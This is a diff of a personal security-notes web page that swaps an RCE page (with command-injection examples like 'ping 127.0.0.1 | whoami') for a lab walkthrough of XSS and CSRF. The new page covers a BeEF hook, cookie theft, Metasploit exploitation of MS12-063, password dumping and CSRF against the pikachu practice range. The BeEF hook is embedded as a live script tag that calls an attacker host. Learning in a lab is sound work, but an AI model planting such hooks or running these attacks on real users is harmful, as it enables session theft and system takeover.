@@ -9,17 +9,17 @@
       
       
       
-        <link rel="prev" href="../PostgreSQL%20%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-9193%EF%BC%89/">
+        <link rel="prev" href="../Vulnhub%20Tomato%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">
       
       
-        <link rel="next" href="../Shiro%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20%EF%BC%88CVE-2020-13933/">
+        <link rel="next" href="../XXE/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.14">
     
     
       
-        <title>RCE - 陈奕霖</title>
+        <title>XSS漏洞利用 - 陈奕霖</title>
       
     
     
@@ -67,7 +67,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#rceremote-commandcode-execute" class="md-skip">
+        <a href="#xss" class="md-skip">
           跳转至
         </a>
       
@@ -102,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              RCE
+              XSS漏洞利用
             
           </span>
         </div>
@@ -673,48 +673,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          RCE
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../RCE/" class="md-nav__link">
         RCE
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#rceremote-commandcode-execute" class="md-nav__link">
-    RCE(remote command/code execute)概述
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -752,11 +715,99 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          XSS漏洞利用
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         XSS漏洞利用
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    一、漏洞利用
+  </a>
+  
+    <nav class="md-nav" aria-label="一、漏洞利用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    1、工具
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2payload" class="md-nav__link">
+    2.构造攻击payload，并欺骗目标机器访问我们的代码
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pilachucsrf" class="md-nav__link">
+    二、更改pilachu账户信息（CSRF:跨站请求伪造）
+  </a>
+  
+    <nav class="md-nav" aria-label="二、更改pilachu账户信息（CSRF:跨站请求伪造）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1burpsuite" class="md-nav__link">
+    1）用BurpSuite
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2kalil" class="md-nav__link">
+    2）在kalil利用脚本对用户进行信息修改
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -939,6 +990,8 @@
   
   
   
+    
+  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -947,9 +1000,56 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#rceremote-commandcode-execute" class="md-nav__link">
-    RCE(remote command/code execute)概述
+  <a href="#_1" class="md-nav__link">
+    一、漏洞利用
   </a>
+  
+    <nav class="md-nav" aria-label="一、漏洞利用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    1、工具
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2payload" class="md-nav__link">
+    2.构造攻击payload，并欺骗目标机器访问我们的代码
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pilachucsrf" class="md-nav__link">
+    二、更改pilachu账户信息（CSRF:跨站请求伪造）
+  </a>
+  
+    <nav class="md-nav" aria-label="二、更改pilachu账户信息（CSRF:跨站请求伪造）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1burpsuite" class="md-nav__link">
+    1）用BurpSuite
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2kalil" class="md-nav__link">
+    2）在kalil利用脚本对用户进行信息修改
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -968,19 +1068,78 @@
                   
 
 
-  <h1>RCE</h1>
+<h1 id="xss">XSS漏洞利用</h1>
+<h3 id="_1">一、漏洞利用</h3>
+<h4 id="1">1、工具</h4>
+<p>apt-get install beef-xss  安装</p>
+<p>beef-xss  启动</p>
+<p>vim /usr/share/beef-xss/config.yaml 修改配置，密码等</p>
+<p>beef-xss-stop  关闭服务</p>
+<p><img alt="img" src="../Untitled.assets/wps39.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps40.jpg" /> </p>
+<h4 id="2payload">2.构造攻击payload，并欺骗目标机器访问我们的代码</h4>
+<script src="http://192.168.8.138:3000/hook.js"></script>
 
-<h2 id="rceremote-commandcode-execute">RCE(remote command/code execute)概述</h2>
-<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p>
-<p>远程系统命令执行</p>
-<p>正常PING</p>
-<p><img alt="img" src="../RCE.assets/wps6.jpg" /> </p>
-<p>Ping 127.0.0.1 | whoami</p>
-<p><img alt="img" src="../RCE.assets/wps7.jpg" /> </p>
-<p>在命令行中一般例如  ipconfig | whoami执行后边命令</p>
-<p>​          ipconfig | |whoami执行前边命令</p>
-<p>​         ipconfig2 | |whoami执行有效命令</p>
-<p>​         ipconfig &amp;&amp;whoami执行后边两个命令</p>
+<p><img alt="img" src="../Untitled.assets/wps41.jpg" /> </p>
+<p>Kali beef显示192.168.8.138</p>
+<p><img alt="img" src="../Untitled.assets/wps42.jpg" /> </p>
+<p>获取cookie信息</p>
+<p><img alt="img" src="../Untitled.assets/wps43.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps44.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps45.jpg" /> </p>
+<p>Kali 使用msfconsole</p>
+<p><img alt="img" src="../Untitled.assets/wps46.jpg" /> </p>
+<p>利用 MS12-063漏洞：</p>
+<p><img alt="img" src="../Untitled.assets/wps47.png" /><img alt="img" src="../Untitled.assets/wps48.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps49.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps50.jpg" /> </p>
+<p>无rhost为被动攻击</p>
+<p>设置srvport为9999</p>
+<p><img alt="img" src="../Untitled.assets/wps51.png" /><img alt="img" src="../Untitled.assets/wps52.png" /><img alt="img" src="../Untitled.assets/wps53.png" /><img alt="img" src="../Untitled.assets/wps54.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps55.jpg" /> </p>
+<p>攻击：</p>
+<p><img alt="img" src="../Untitled.assets/wps56.png" /><img alt="img" src="../Untitled.assets/wps57.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps58.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps59.jpg" /> </p>
+<p>获取权限：</p>
+<p><img alt="img" src="../Untitled.assets/wps60.jpg" /> </p>
+<p>获取密码</p>
+<p><img alt="img" src="../Untitled.assets/wps61.jpg" /> </p>
+<p>获取密钥</p>
+<p><img alt="img" src="../Untitled.assets/wps62.jpg" /> </p>
+<p>破解密码：</p>
+<p><img alt="img" src="../Untitled.assets/wps63.jpg" /> </p>
+<h3 id="pilachucsrf">二、更改pilachu账户信息（CSRF:跨站请求伪造）</h3>
+<h4 id="1burpsuite">1）用BurpSuite</h4>
+<p>1.打开登录pikachu用户界面，进入CSRF(get)</p>
+<p><img alt="img" src="../Untitled.assets/wps64.jpg" /> </p>
+<p>打开burp suite</p>
+<p>并打开代理</p>
+<p><img alt="img" src="../Untitled.assets/wps65.jpg" /> </p>
+<p>对登录页面，点击修改个人信息，修改信息开始抓包</p>
+<p><img alt="img" src="../Untitled.assets/wps66.jpg" /> </p>
+<p>将抓到的含有账户密码等信息发送到repeater</p>
+<p><img alt="img" src="../Untitled.assets/wps67.jpg" /> </p>
+<p>将用户信息在request中进行修改，并send</p>
+<p><img alt="img" src="../Untitled.assets/wps68.jpg" /> </p>
+<p>返回到pikachu页面刷新</p>
+<p><img alt="img" src="../Untitled.assets/wps69.jpg" /> </p>
+<p>信息已被修改</p>
+<h4 id="2kalil">2）在kalil利用脚本对用户进行信息修改</h4>
+<p>将脚本文件IP地址改为要攻击的主机地址，并放入kali var/www/html文件夹下</p>
+<p><img alt="img" src="../Untitled.assets/wps70.jpg" /> </p>
+<p><img alt="img" src="../Untitled.assets/wps71.jpg" /> </p>
+<p>打开卡里的apache服务</p>
+<p><img alt="img" src="../Untitled.assets/wps72.jpg" /> </p>
+<p>查看csrftest.php文件，红线框内为要将受害用户的信息更改的结果</p>
+<p><img alt="img" src="../Untitled.assets/wps73.png" /><img alt="img" src="../Untitled.assets/wps74.jpg" /> </p>
+<p>在受害机内点开192.168.8.138/csrftest.php（kali机IP）</p>
+<p><img alt="img" src="../Untitled.assets/wps75.jpg" /> </p>
+<p>访问此页面后返回pikachu信息界面进行刷新</p>
+<p><img alt="img" src="../Untitled.assets/wps76.jpg" /> </p>
+<p>信息已被修改。</p>
+<p>遇到问题：打开kali的Apache服务在受害机无法打开192.168.8.138/csrftest.php文件的页面，从而无法实现更改受害用户信息。</p>
+<p>解决方案：打开kali中var/www/html文件下脚本文件的最高权限</p>
 
 
 
